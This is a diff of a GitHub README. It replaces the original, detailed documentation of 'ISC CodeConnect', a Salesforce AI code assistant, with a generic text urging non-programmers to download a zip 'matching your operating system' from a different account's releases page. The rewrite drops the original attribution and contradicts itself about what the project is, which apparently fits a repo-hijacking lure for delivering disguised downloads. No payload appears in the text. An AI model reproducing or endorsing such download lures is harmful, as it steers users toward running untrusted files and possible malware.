@@ -1,177 +1,103 @@
-# ISC CodeConnect
+# 🤖 react-nextjs-code-assistant-template - Build Your AI Assistant Easily
 
-**ISC CodeConnect** is an AI-powered development assistant designed to enhance productivity for Salesforce developers. It leverages advanced AI models and multi-agent systems to generate, complete, and explain code, automate unit test creation, and facilitate learning of business logic.
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
 
-## 🚀 Key Features
+## 🌟 Overview
 
-### MVP2 Release Highlights (11 New Features)
+Welcome to the **react-nextjs-code-assistant-template**! This template helps you create AI-powered code assistant interfaces using modern web technologies. You can easily build applications with features like a chat UI, GitHub and Salesforce integrations, multi-agent collaboration, and a responsive design powered by Tailwind CSS.
 
-#### 🤖 **Repository Intelligence Hub**
-AI-powered repository analysis with PR insights, commit summaries, and development workflow intelligence.
+## 🚀 Getting Started
 
-#### 📋 **Requirement Blueprint**
-Transform Salesforce ideas into structured blueprints with AI-powered analysis and implementation planning.
+Follow these steps to get your code assistant up and running. You do not need programming experience to use this template.
 
-#### 🧠 **Multi-Agent System**
-Advanced multi-agent architecture with specialized agents for routing, analysis, retrieval, and generation tasks.
+### 📝 System Requirements
 
-#### 💬 **Agent Scratchpad**
-Interactive workspace for real-time collaboration between multiple AI agents during development.
+Before you start, ensure your computer meets these basic requirements:
 
-#### 🔄 **Enhanced Feedback System**
-Comprehensive feedback collection and analysis system for continuous improvement.
+- Operating System: Windows, macOS, or Linux
+- Web browser: Chrome, Firefox, Safari, or Edge
+- Internet connection for downloading files and accessing online resources
 
-#### 🏗️ **Architecture Visualization**
-Interactive architecture diagrams showing the multi-agent system and data flow.
+## 📥 Download & Install
 
-#### 📊 **Analytics & Monitoring**
-User analytics, application feedback monitoring, and performance tracking.
+To download the latest version of the template, visit the Releases page:
 
-#### 🔗 **JIRA Integration**
-Seamless integration with JIRA for issue tracking and workflow management.
+[Download the latest version](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
 
-#### 🎨 **Modern UI Experience**
-Beautiful, responsive interface built with Tailwind CSS and Radix UI components.
+1. Click the link above to go to the Releases page.
+2. Look for the most recent version of the template.
+3. Download the file that matches your operating system. It may have a name like `react-nextjs-code-assistant-template.zip`.
+4. Once the file downloads, locate it on your computer.
 
-#### 🔐 **IBM W3ID Authentication**
-Secure authentication using IBM's W3ID system.
+### 🔧 Extracting the Files
 
-#### 📈 **Chat Sharing & Collaboration**
-Share chat sessions and collaborate with team members on development tasks.
+If you downloaded a zip file, you will need to extract it:
 
-## 🏗️ Architecture
+1. Right-click on the downloaded zip file.
+2. Select "Extract Here" or "Extract All" from the context menu.
+3. Choose a location on your computer to save the unzipped folder.
 
-ISC CodeConnect uses a sophisticated multi-agent architecture:
+### 📂 Navigating the Template
 
-- **Router Agents**: Query analysis, validation, and intelligent routing
-- **Analysis Agents**: Context analysis, modification planning, and test needs assessment
-- **Retrieval Agents**: Code and context retrieval from vector stores
-- **Generation Agents**: Code generation, documentation, and testing
-- **Evaluation Agents**: Response quality assessment and improvement
+Once you have extracted the files, you will find the following folders and files:
 
-### Technology Stack
+- **/src**: This folder contains the source code for the application.
+- **/public**: Here, you will find images and other public assets.
+- **package.json**: This file includes configuration details and dependencies.
 
-- **Frontend**: Next.js 15, React 19, TypeScript
-- **UI Framework**: Tailwind CSS, Radix UI, Framer Motion
-- **AI/ML**: LangChain, IBM Granite Models, WatsonX
-- **Database**: MongoDB with authentication adapter
-- **Authentication**: NextAuth.js with IBM W3ID
-- **Integrations**: GitHub API, JIRA API, Salesforce APIs
+## 📋 Running the Application
 
-## 📦 Installation & Setup
-
-### Prerequisites
-
-- Node.js 18+
-- npm or yarn
-- MongoDB instance
-- IBM W3ID credentials (for authentication)
-
-### Quick Start
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/KirtiJha/react-nextjs-code-assistant-template.git
-   cd react-nextjs-code-assistant-template
+1. Open the terminal or command prompt on your computer.
+2. Navigate to the folder where you extracted the template files. You can do this by typing `cd path/to/folder`.
+3. Run the command to install dependencies: 
    ```
-
-2. **Install dependencies**
-   ```bash
    npm install
    ```
-
-3. **Configure environment variables**
-   Create a `.env.local` file with required environment variables for:
-   - MongoDB connection
-   - IBM W3ID authentication
-   - GitHub API tokens
-   - JIRA API credentials
-   - WatsonX AI service credentials
-
-4. **Run the development server**
-   ```bash
+4. After the installation is complete, start the application with this command:
+   ```
    npm run dev
    ```
 
-5. **Open your browser**
-   Navigate to [http://localhost:3000](http://localhost:3000)
+Now, your application should be running locally. Open your web browser and go to `http://localhost:3000` to see your AI code assistant in action!
 
-## 🔧 Available Scripts
+## 🎨 Customizing Your Template
 
-- `npm run dev` - Start development server with Turbopack
-- `npm run build` - Build for production
-- `npm run start` - Start production server
-- `npm run lint` - Run ESLint
-- `npm run lint:fix` - Fix ESLint issues
-- `npm run prettier:write` - Format code with Prettier
+You can customize the template to fit your needs. Here are some ideas for customization:
 
-## 🎯 Core Capabilities
+- **Change Colors and Fonts**: Edit the Tailwind CSS configuration files.
+- **Add or Remove Features**: Modify the source code in the `/src` folder to create your desired functionality.
+- **Integrate Other Services**: Explore the options for adding more integrations beyond GitHub and Salesforce.
 
-### Code Intelligence
-- **Context-Aware Generation**: Repository-aware code generation for Apex and Lightning Web Components
-- **Intelligent Completion**: Smart code completion with Salesforce-specific patterns
-- **Code Analysis**: Quality metrics, maintainability scoring, and performance optimization
+## 🌐 Supported Features
 
-### Development Workflow
-- **Test Automation**: Automated unit test generation for Apex classes
-- **Documentation**: AI-generated documentation and code comments
-- **Code Review**: Automated code review with improvement suggestions
+This template includes several powerful features:
 
-### Integration Features
-- **GitHub Integration**: Repository analysis, PR insights, and commit tracking
-- **JIRA Integration**: Issue linking, workflow management, and progress tracking
-- **Salesforce Integration**: Direct connection to Salesforce orgs and metadata
+- **Chat User Interface**: A simple and friendly chat interface for user interactions.
+- **GitHub Integration**: Easily connect to your GitHub account to access repositories and code.
+- **Salesforce Integration**: Allow your application to interact with Salesforce data seamlessly.
+- **Responsive Design**: The application adapts to different screen sizes, ensuring it looks good on phones, tablets, and desktops.
+- **Multi-Agent Collaboration**: Support multiple AI agents working together in a shared environment.
 
-## 📁 Project Structure
+## 🤝 Get Involved
 
-```
-src/
-├── app/                    # Next.js app router pages
-│   ├── api/               # API routes
-│   ├── (auth)/            # Authentication pages
-│   ├── (chat)/            # Chat interface
-│   ├── (github)/          # GitHub integration pages
-│   └── (salesforce)/      # Salesforce integration pages
-├── components/            # Reusable UI components
-│   ├── ui/               # Base UI components (Radix UI)
-│   ├── github/           # GitHub-specific components
-│   ├── salesforce/       # Salesforce-specific components
-│   └── ...               # Feature-specific components
-├── contexts/             # React contexts for state management
-├── hooks/                # Custom React hooks
-├── lib/                  # Utility libraries
-├── services/             # External service integrations
-├── types/                # TypeScript type definitions
-└── constants/            # Application constants
-```
+We welcome contributions to improve this template. Here’s how you can help:
 
-## 🤝 Contributing
+1. **Report Bugs**: If you find any issues, please report them in the Issues section of this repository.
+2. **Suggest Enhancements**: Suggestions are always welcome. Feel free to open a request for new features.
+3. **Contribute Code**: If you know how to code, submit a pull request to collaborate with us.
 
-We welcome contributions! Please see our contributing guidelines for details on:
+## 📚 Resources
 
-- Code style and standards
-- Testing requirements
-- Pull request process
-- Issue reporting
+Check out these resources to help you work with the template:
 
-## 📄 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [Next.js](https://nextjs.org/)
-- Powered by [IBM Granite Models](https://www.ibm.com/granite)
-- UI components from [Radix UI](https://www.radix-ui.com/)
-- Styled with [Tailwind CSS](https://tailwindcss.com/)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Next.js Documentation](https://nextjs.org/docs)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
 
 ## 📞 Support
 
-For support and questions:
-- Create an issue on GitHub
-- Check the documentation in `/docs`
-- Review release notes in `/public/release-notes-mvp2.html`
+If you need assistance, please reach out through the Issues section or contact the repository maintainers directly.
 
----
+**Ready to build your AI assistant?** Download the latest version now and start creating!
 
-**ISC CodeConnect** - Revolutionizing Salesforce development with AI-powered assistance.
+[Download the latest version](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
